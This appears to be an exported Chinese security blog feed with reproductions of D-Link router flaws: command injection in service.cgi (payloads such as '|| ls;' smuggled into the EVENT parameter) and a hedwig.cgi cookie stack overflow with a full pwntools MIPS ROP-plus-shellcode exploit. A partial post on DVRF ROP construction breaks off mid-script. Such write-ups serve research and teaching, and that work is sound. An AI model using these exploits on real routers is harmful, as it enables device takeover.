    <content type="html"><![CDATA[<h1 id="CNVD-2018-01084-Dlink远程命令执行漏洞"><a href="#CNVD-2018-01084-Dlink远程命令执行漏洞" class="headerlink" title="CNVD-2018-01084-Dlink远程命令执行漏洞"></a>CNVD-2018-01084-Dlink远程命令执行漏洞</h1><p>CNVD-2018-01084是D-Link DIR 615&#x2F;645&#x2F;815路由器1.03及之前的固件版本存在远程命令执行漏洞。该漏洞是由于service.cgi中拼接了HTTP POST请求中的数据，造成后台命令拼接，导致可执行任意命令。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h3><p>由CNVD可知，漏洞点在<code>service.cgi</code> 中，我们直接分析<code>servicecgi_main</code> 即可。</p><p><strong>servicecgi_main</strong></p><p>首先，获取环境变量<code>REQUEST_METHOD</code>的值，若为<strong>post</strong>请求，则顺序执行；若为<strong>get</strong>请求，则跳转到LABEL_10，会直接越过了漏洞点，所以我们需要执行<strong>post</strong>请求。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230703211741239.png" alt="image-20230703211741239"></p><p>接着，调用<code>cgibin_parse_request</code>函数，该函数已经在笔者<a href="https://lst-oss.github.io/2023/07/02/dir-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">上一篇文章</a>中分析过了，就不再赘述了。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230703212031069.png" alt="image-20230703212031069"></p><p>这里，我们主要看看<code>sub_40A63C</code>这个函数。当<strong>URI</strong>参数被解析后，调用该函数对<code>off_42c120</code>进行初始化。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230703223620711.png" alt="image-20230703223620711"></p><p>我们再看看<code>sub_403b10</code>函数。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704091221215.png" alt="image-20230704091221215"></p><p>这个函数也很简单，判断**application&#x2F;**类型，若是匹配上了调用<code>sub_203ffc</code>函数。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704091316062.png" alt="image-20230704091316062"></p><p><code>sub_203ffc</code>函数应该是获取post请求的内容，同时调用<code>sub_402b40</code>对输入的内容进行划分。需要注意的是这里也会对<code>off_42c120</code>进行初始化。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704091457433.png" alt="image-20230704091457433"></p><p>让我们回到主函数里面。接着，会调用<code>sess_ispoweruser</code> 进行用户判断。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085131038.png" alt="image-20230704085131038"></p><p>这个函数仅仅是对<code>sess_validate</code> 函数的简单封装。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085253125.png" alt="image-20230704085253125"></p><p><code>sess_validate</code>函数会打开<strong>sesscfg</strong>，<strong>session%d</strong>等大量session文件，直到匹配为止。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085804332.png" alt="image-20230704085804332"></p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704085737003.png" alt="image-20230704085737003"></p><p>这里模拟的固件一般不具备seesion，我们把这个函数判断patch掉即可。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704090044509.png" alt="image-20230704090044509"></p><p>之后会调用<code>sub_40A1C0</code>匹配EVENT、ACTION与SERVICE。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704090138244.png" alt="image-20230704090138244"></p><p>这个函数也比较简单，就是对我们输入内容与EVENT等进行匹配。若匹配上，则返回输入的内容。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704090257048.png" alt="image-20230704090257048"></p><p>最后，执行<code>lxmldbc_system</code>函数，也就是可以命令注入的函数。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704092222684.png" alt="image-20230704092222684"></p><p>该函数就是将我们的输入复制到<strong>acStack_40c</strong>变量中，然后执行。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704092350052.png" alt="image-20230704092350052"></p><p>这里并未对输入进行过滤，也就是存在任意命令执行漏洞。</p><p>至此，分析完毕。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据上面分析，可知这里存在两条执行路径。</p><p>第一条，利用URI进行任意命令执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">input=&quot;l1s00t&quot;<br>cmd=&quot;|| ls;&quot;<br><br>echo $input | qemu-mipsel -L . \<br>    -0 &quot;service.cgi&quot; \<br>    -E REQUEST_METHOD=&quot;POST&quot; \<br>    -E REQUEST_URI=&quot;l1s00t?EVENT=$cmd&quot; \<br>    -E CONTENT_LENGTH=`echo -n $input | wc -c` \<br>    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \<br>    ./htdocs/cgibin<br><br></code></pre></td></tr></table></figure><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704093231095.png" alt="image-20230704093231095"></p><p>第二条，通过post请求输入内容进行任意命令执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">input=&quot;EVENT=|| pwd; #&quot;<br>cmd=&quot;|| ls;&quot;<br><br>echo $input | qemu-mipsel -L . \<br>    -0 &quot;service.cgi&quot; \<br>    -E REQUEST_METHOD=&quot;POST&quot; \<br>    -E REQUEST_URI=&quot;l1s00t?EVENT=$cmd&quot; \<br>    -E CONTENT_LENGTH=`echo -n $input | wc -c` \<br>    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \<br>    ./htdocs/cgibin<br><br></code></pre></td></tr></table></figure><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704093344171.png" alt="image-20230704093344171"></p><p>同时，也可以看到，我们post输入的内容是可以覆盖URI的。与上面的分析也不谋而合。</p><p>这里，我们使用调试查看命令执行过程。</p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704093726056.png" alt="image-20230704093726056"></p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704094032648.png" alt="image-20230704094032648"></p><p><img src="/img/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20230704094118204.png" alt="image-20230704094118204"></p><p>至此，漏洞复现完毕。</p><p>参考文章：</p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084">https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084</a></p><p><a href="https://bbs.kanxue.com/thread-272212.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-272212.htm#msg_header_h1_0</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>mips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dir-815 栈溢出漏洞复现</title>
    <link href="/2023/07/02/dir-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/07/02/dir-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="dir-815-栈溢出漏洞复现"><a href="#dir-815-栈溢出漏洞复现" class="headerlink" title="dir-815 栈溢出漏洞复现"></a>dir-815 栈溢出漏洞复现</h1><p><strong>CNVD-2013-11625</strong>是Dir-815路由器在<code>hedwig.cgi</code>实现中会存在缓冲区溢出的漏洞。漏洞不正确过滤用户提交的参数数据，允许远程攻击者利用漏洞提交特制请求触发缓冲区溢出，可使应用程序停止响应，造成拒绝服务攻击。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><p>使用 <code>binwalk -Me DIR-815A1_FW101SSB03.bin</code>解压固件。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702120541796.png" alt="image-20230702120541796"></p><p>根据官方提示，漏洞存在于<code>hedwig.cgi</code>中，直接使用<code>find ./ -name &#39;*.cgi&#39; 2&gt;/dev/null</code>搜索。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702120855993.png" alt="image-20230702120855993"></p><p>事实上，该固件<strong>cgi</strong>都是实现在<code>/htdocs/cgibin</code>中的。我们对<code>cgibin</code>进行分析即可。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>在IDA中打开，首先分析main函数。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702170228610.png" alt="image-20230702170228610"></p><p>可以看到，通过比较第一个参数是否为<code>hedwig.cig</code>，从而调用关键函数<code>hedwigcgi_main</code>函数。</p><h4 id="hedwigcgi"><a href="#hedwigcgi" class="headerlink" title="hedwigcgi"></a>hedwigcgi</h4><p>首先，获取环境变量<code>request_methed</code>。判断是否为POST请求，若不是，则直接失败返回。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702170521593.png" alt="image-20230702170521593"></p><p>接下来，会调用<code>cgibin_parse_request</code>函数进行解析。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702171704472.png" alt="image-20230702171704472"></p><h5 id="cgibin-parse-request"><a href="#cgibin-parse-request" class="headerlink" title="cgibin_parse_request"></a>cgibin_parse_request</h5><p>首先，获取环境变量<code>CONTENT_TYPE</code>与<code>CONTENT_LENGTH</code></p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702171818689.png" alt="image-20230702171818689"></p><p>之后，获取环境变量<code>REQUEST_URI</code>，并使用**?**对该参数进行分割，之后调用<code>sub_402b40</code>函数对后续进行分割。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702171947690.png" alt="image-20230702171947690"></p><h6 id="sub-402b40"><a href="#sub-402b40" class="headerlink" title="sub_402b40"></a>sub_402b40</h6><p>对后续参数继续进行分割。若遇到**&amp;<strong>，则递归调用<code>sub_402b40</code>继续分割参数；若遇到</strong>&#x3D;<strong>，就添加到变量v14中。也就是对</strong>URI**进行更细致的分割。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702172157179.png" alt="image-20230702172157179"></p><p>我们继续向下分析<code>cgibin_parse_request</code>函数。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173021321.png" alt="image-20230702173021321"></p><p>获取环境变量<code>CONTENT_TYPE</code>，然后与**application&#x2F;**进行比较，之后调用数组<code>off_42c014</code>中的函数。该数组在data段，查看该数组内容。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173400292.png" alt="image-20230702173400292"></p><p>大致就是，根据<code>CONTENT_TYPE</code>类型，调用不同的函数进行初始化。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173625329.png" alt="image-20230702173625329"></p><p>这里也可以得到，我们的参数类型大致为 <code>CONTENT_TYPE/x-www-form-urlencoded</code>。</p><p>我们继续看<code>hedwigcgi</code>函数。</p><p>之后，会打开文件，并读入文件到v26中，貌似没什么用。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702173826847.png" alt="image-20230702173826847"></p><p>之后调用<code>sess_get_uid</code>函数，这个函数是溢出的一个关键函数。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174015004.png" alt="image-20230702174015004"></p><p>若是<strong>string</strong>足够大，即可溢出v27[1024]数组了。</p><h5 id="sess-get-uid"><a href="#sess-get-uid" class="headerlink" title="sess_get_uid"></a>sess_get_uid</h5><p>首先，获取环境变量<code>HTTP_COOKIE</code>，然后对<strong>cookie</strong>进行处理。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174139754.png" alt="image-20230702174139754"></p><p>逐个拆分获取<strong>cookie</strong>字段，直到获取<strong>uid</strong>字段，并返回该字段内容。注意，这个字段是我们可控的。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174453733.png" alt="image-20230702174453733"></p><p>继续分析<code>hedwigcgi</code>函数。</p><p>我们需要绕过如下两个判断，其实这也不需要我们刻意绕过，正常机器下都是可以通过的。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702174814875.png" alt="image-20230702174814875"></p><p>之后，对上述**&#x2F;var&#x2F;tmp&#x2F;temp.xml**字段进行处理，这里也没有判断逻辑，就是顺序执行。若是真机，则不需要处理。否则，需要直接创建一个新的空白xml文件即可。</p><p>上述执行都未对v4进行处理，所以v4还是<strong>uid</strong>字段内容。这里就是真正的栈溢出。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702175120384.png" alt="image-20230702175120384"></p><p>至此，分析完毕。下面我们对该漏洞进行验证。</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>对上述漏洞进行验证。验证脚本大致如下，这里我是直接参考<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">winmt师傅</a>的验证脚本，主要是太菜了。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702180154603.png" alt="image-20230702180154603"></p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702180735956.png" alt="image-20230702180735956"></p><p>可以看到，我们触发了一个段错误。但是为了避免是其他原因引起的，我们添加<code>-g 4321</code>进行动态调试。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702180916223.png" alt="image-20230702180916223"></p><p>这里我们确实覆盖了返回地址。且溢出长度为1009。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>路由器一般都是没有开启地址随机化的，我们可以直接获取到libc基地址，从而进行任意函数调用。</p><p>这里使用vmmap查看libc基址，可以看到为libc_base &#x3D; 0x7f738000。</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702181649179.png" alt="image-20230702181649179"></p><p>接着，就是mips架构的栈溢出了。</p><p>若是对mips架构不太了解的，大致可以看看笔者之前的<a href="https://lst-oss.github.io/2023/02/04/CVE-2019-10999-Dlink%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">博客</a>。</p><p>mips架构的程序大都未开启NX保护，栈可以直接执行shellcode。mips架构的栈溢出一般都有一条稳定的rop链。大致是<code>sleep(1) + shellcode</code>。</p><p>这里rop链子的构造的原理可以参考笔者另一篇<a href="https://lst-oss.github.io/2023/07/02/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/#Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0">博客</a>。</p><p>最终构造的wp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;mips&#x27;</span><br> <br>libc_base = <span class="hljs-number">0x7F738000</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x3cd</span>: &#123;<br>            <span class="hljs-number">0</span>: <span class="hljs-string">&#x27;aaaa&#x27;</span>,  <span class="hljs-comment"># s0</span><br>            <span class="hljs-number">0x4</span>: libc_base + <span class="hljs-number">0x436d0</span>,  <span class="hljs-comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br>            <span class="hljs-number">0xc</span>: libc_base + <span class="hljs-number">0x56BD0</span>,  <span class="hljs-comment"># s3  sleep</span><br>            <span class="hljs-number">0x24</span>: libc_base + <span class="hljs-number">0x57E50</span>,  <span class="hljs-comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span><br>            <span class="hljs-number">0x28</span>: &#123;<br>                <span class="hljs-number">0x28</span>: libc_base + <span class="hljs-number">0x37E6C</span>,  <span class="hljs-comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br>                <span class="hljs-number">0x2c</span>: libc_base + <span class="hljs-number">0x3B974</span>,  <span class="hljs-comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br>            &#125;<br>        &#125;<br>    &#125;, filler=<span class="hljs-string">&#x27;a&#x27;</span><br>)<br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += asm(shellcraft.sh())<br><br>payload = <span class="hljs-string">b&quot;uid=&quot;</span> + payload<br>p = process(<span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">    qemu-mipsel -L ./ \</span><br><span class="hljs-string">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="hljs-string">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="hljs-string">    -E CONTENT_LENGTH=11 \</span><br><span class="hljs-string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="hljs-string">    -E HTTP_COOKIE=&quot;%s&quot; \</span><br><span class="hljs-string">    -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="hljs-string">    ./htdocs/cgibin</span><br><span class="hljs-string">&quot;&quot;&quot;</span> % payload, shell = <span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># pause()</span><br><br><span class="hljs-comment"># POST</span><br>content = <span class="hljs-string">&quot;test=l1s00t&quot;</span><br>p.send(content)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702232715503.png" alt="image-20230702232715503"></p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702231818526.png" alt="image-20230702231818526"></p><p>成功获取shell。</p><p>对上述payload做一个简单的解释。</p><ol><li>测试得到的offset&#x3D;1009，但是payload使用的offset&#x3D;0x3cd？</li></ol><p>我们的目的不是仅仅覆盖$ra，包括其他$s?参数，以便于我们更好的控制程序执行流程</p><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702231950195.png" alt="image-20230702231950195"></p><ol start="2"><li>第二段payload是从0x28开始的，其目的在于控制$ra与$r4寄存器，以便在<code>sleep(1)</code>执行后依然可以控制程序流程。</li></ol><p><img src="/img/dir-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230702232444887.png" alt="image-20230702232444887"></p><p><strong>参考文章</strong></p><p><a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mips栈溢出常见ROP构造</title>
    <link href="/2023/07/02/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/"/>
    <url>/2023/07/02/mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Mips栈溢出常见ROP构造"><a href="#Mips栈溢出常见ROP构造" class="headerlink" title="Mips栈溢出常见ROP构造"></a>Mips栈溢出常见ROP构造</h1><p>参考大佬的博客，在 GitHub 上找到了一个较好的靶机，适合新手来练手。</p><p>其地址为：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>使用 <code>binwalk</code>提取固件系统。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">binwalk -Me ./DVRF_v03.<span class="hljs-built_in">bin</span><br></code></pre></td></tr></table></figure><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/1.png" alt="img"></p><p>进入固件系统，我们在 pwnable 目录下可以看到两个目录，分别保存着 mips 架构下有漏洞的程序。接下来我们将对其进行分析。</p><p>由于我们的系统是 x86 架构下的，无法直接启动。所以我们使用 qemu 启动， -L 指定根目录。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cp</span> <span class="hljs-variable">$</span>(which qemu<span class="hljs-literal">-mipsel-static</span>) .<br>./qemu<span class="hljs-literal">-mipsel-static</span> <span class="hljs-literal">-L</span> ./ ./pwnable/ShellCode_Required/stack_bof_02<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>首先，我们将程序拖入 IDA 中查看。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/2.png" alt="img"></p><p>很明显，程序存在栈溢出漏洞。</p><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>我们使用 gdb 动态调试确定偏移量。当然，这里可以在 IDA 中直接查看，但是 IDA 分析出的不一定对，建议使用 gdb 确定。</p><p>使用 cyclic 生成 600 bytes，并输入到 test 文件中。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/3.png" alt="img"></p><p>输入以下命令运行程序，-g 指定远程调试端口。然后直接使用 gdb 连就可以了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./qemu<span class="hljs-literal">-mipsel-static</span> <span class="hljs-literal">-L</span> ./ <span class="hljs-literal">-g</span> <span class="hljs-number">1234</span> ./pwnable/ShellCode_Required/stack_bof_02 `cat test`<br></code></pre></td></tr></table></figure><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/4.png" alt="img"></p><p>可以确定，从输入到返回地址偏移量为 508 。</p><p>接下来就是 ROP 链的构造了。我们重点关注<strong>ROP 链的构造以及 sleep(1) 的用法。</strong></p><p>对于mips架构的程序而言，我们可以使用 <code>ropper</code>或者 <code>mipsrop</code>查找。我们一般可以两者结合使用。</p><h4 id="布置ROP"><a href="#布置ROP" class="headerlink" title="布置ROP"></a>布置ROP</h4><p>首先，调用前需要传递参数。我们可使用 mipsrop 寻找 <code>li $a0, 1</code>这类的 gadget 传递参数。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/5.png" alt="img"></p><p>我们使用 0x2fb10 这个gadget。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/6.png" alt="img"></p><p>这个 gadget 跳转到 $1 的位置，所以我们还需要找到可以控制 $s1 的 gadget。参考 <a href="https://www.anquanke.com/post/id/172126">这里</a> ，我们可以在 <code>scandir</code>函数中找到一段近乎通用的 gadget，可以很方便的控制参数。</p><p><img src="/img/Mips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81ROP%E6%9E%84%E9%80%A0/7.png" alt="img"></p><p>到了这里，我们基于可以构造出 sleep(1) 了。我们使用以下脚本构造，并尝试输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 